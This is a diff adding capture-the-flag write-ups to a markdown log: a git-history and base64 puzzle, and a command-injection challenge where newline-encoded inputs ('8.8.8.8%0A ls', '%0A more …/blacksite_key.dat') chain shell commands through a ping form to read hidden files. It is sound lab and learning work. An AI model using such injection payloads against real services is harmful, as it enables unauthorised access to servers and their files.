@@ -136,6 +136,33 @@ Learned about ROT ciphers, specifically ROT13 and ROT47, and how reversing the e
 
 
 
+
+# Randomly Accessed Memories  
+This challenge involves analyzing a GitHub repository to uncover hidden information. The repository contains cryptic commits related to Daft Punk's music and is intertwined with git commands. The task is to find specific missing commits and decode base64 encoded data to retrieve the flag.
+
+## My Solve  
+**Flag:** `citadel{w3_4r3_up_4ll_n1t3_t0_g1t_lucky}`
+1. We started the challenge by opening the provided GitHub link and cloned the repository to our local machine.  
+2. Upon examining the files, We noticed that the "notes" files didn't contain any relevant information.  
+3. We then opened the `changes` file and noticed that commits 56, 122, and 279 were missing from the list.  
+4. We decided to look through the commit history using `git log` and found that the commits were scattered and not in order.  
+5. After scrolling through the commit history, We found a commit titled `Add secret chunk 3 (base64)` with commit hash 279.
+6. We searched for the other missing commits and found that each contained a base64 encoded message.
+7. Then, the next problem was that we had to convert the base 64 encoded data into the flag. We simply went into a base64 encoder and decoder software and pasted the three encoded statements. 
+8. Decoding the messages revealed the flag.
+
+## What I Learned  
+- I learned about the importance of understanding git commit history and how to navigate through it.  
+- I gained practical experience with base64 encoding and decoding.  
+- I realized the significance of attention to detail when looking for anomalies like missing commit numbers.  
+
+## References  
+- [Base 64 Decode Tool](https://www.base64decode.org/) - Used for decoding the base64 encoded messages.
+
+
+
+
+
 # Selected Ambient Work
 The challenge provides us with an audio file with a hidden message. The task is to uncover the secret message embedded in the audio, despite background music noises and distortion it. The flag should be formatted with uppercase words separated by underscores.
 
@@ -392,3 +419,111 @@ The challenge required participants to track the digital footprints of a user na
 - [RateYourMusic](https://rateyourmusic.com)
 - [Spotify](https://www.spotify.com)
 - [Last.fm](https://www.last.fm)
+
+
+
+
+
+
+# AetherCorp NetprobeX
+This challenge required us to uncover a hidden backdoor in the NetProbeX system, a remnant of the former AetherCorp. The task involved analyzing logs and exploiting vulnerabilities to retrieve a passcode. The engineers left subtle hints in the logs, which we had to decipher to progress. Our goal was to find and exploit this backdoor to get the flag.
+
+## My solve
+**Flag:** `citadel{bl4ck51t3_4cc3ss_gr4nt3d}`
+
+1. Initially, I was unsure what to do, so I started by testing the input field with the placeholder text provided. I entered `8.8.8.8` in the textbox, which triggered a ping command. Here is the response I received:
+
+   ```bash
+   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.90 ms
+   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.85 ms
+   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.95 ms
+   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.96 ms
+
+   --- 8.8.8.8 ping statistics ---
+   4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+   rtt min/avg/max/mdev = 3.845/3.913/3.961/0.046 ms
+   ```
+
+2. I tried entering other commands like `ls` but received an error: `ping: ls: No address associated with hostname`. This indicated that the system was interpreting my input as part of the ping command and not executing shell commands directly.
+
+3. I then searched on google to find something so that we can write it without any error. I got to know about using `%0A` to inject multiple commands. I tested this by entering `8.8.8.8%0A ls`:
+
+   ```bash
+   Executing: ping -c 4 8.8.8.8%0A ls
+
+   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.82 ms
+   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=4.00 ms
+   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.97 ms
+   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.97 ms
+
+   --- 8.8.8.8 ping statistics ---
+   4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+   rtt min/avg/max/mdev = 3.818/3.938/4.000/0.070 ms
+   app.py
+   mission_briefing.txt
+   requirements.txt
+   templates
+   ```
+
+   This revealed several files, including `mission_briefing.txt`.
+
+4. I tried reading the contents of `mission_briefing.txt` using `more` (since `cat` wasn't working, so i searched on google to find any alternatives of `cat`) with the command `8.8.8.8%0A more mission_briefing.txt`:
+
+   ```
+   ================= OPERATION: SILENT ECHO =================
+                   CLASSIFICATION: BLACK ICE
+
+   Agent, your objective is to recover the Blacksite Key.
+   Our intel confirms it’s hidden deep within the AetherCorp network.
+   =========================================================
+   ```
+
+   The file hinted at a hidden key deep within the network.
+
+5. I used the `find` command to locate directories related to AetherCorp or Aether. So i used the `file` command to search the location of the folder if it exists from the root directory:
+
+   ```bash
+   8.8.8.8%0A find / -name aethercorp
+   ```
+
+   This returned `/var/lib/aethercorp` as the only accessible folder with no permission constraints.
+
+6. Exploring further i listed further and then after some more hit and trials found the `archive` folder and I found a hidden `.secrets` directory within `/var/lib/aethercorp/archive` using:
+
+   ```bash
+   8.8.8.8%0A ls /var/lib/aethercorp/archive -a
+   ```
+
+   Inside the `.secrets` directory was a file called `blacksite_key.dat`.
+
+7. Finally, I viewed the contents of `blacksite_key.dat` using:
+
+   ```bash
+   8.8.8.8%0A more /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
+   ```
+
+   This revealed the flag.
+   ```bash
+   4 packets transmitted, 4 received, 0% packet loss, time 3003ms
+   rtt min/avg/max/mdev = 3.918/3.966/4.015/0.038 ms
+   ::::::::::::::
+   /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
+   ::::::::::::::
+   citadel{bl4ck51t3_4cc3ss_gr4nt3d}
+   ```
+
+## What I learned
+
+This challenge taught me about:
+
+- Command Injection using `%0A` to chain commands in restricted environments.
+- Alternative File Viewing using tools like `more` or `less` when `cat` is unavailable or not allowed.
+- Navigating through system directories to uncover hidden files and folders.
+- Understanding how to interpret subtle hints left behind in logs.
+
+## References
+
+- Google for command injection techniques and alternative file viewing methods.
+- ChatGPT for syntax and command structures.
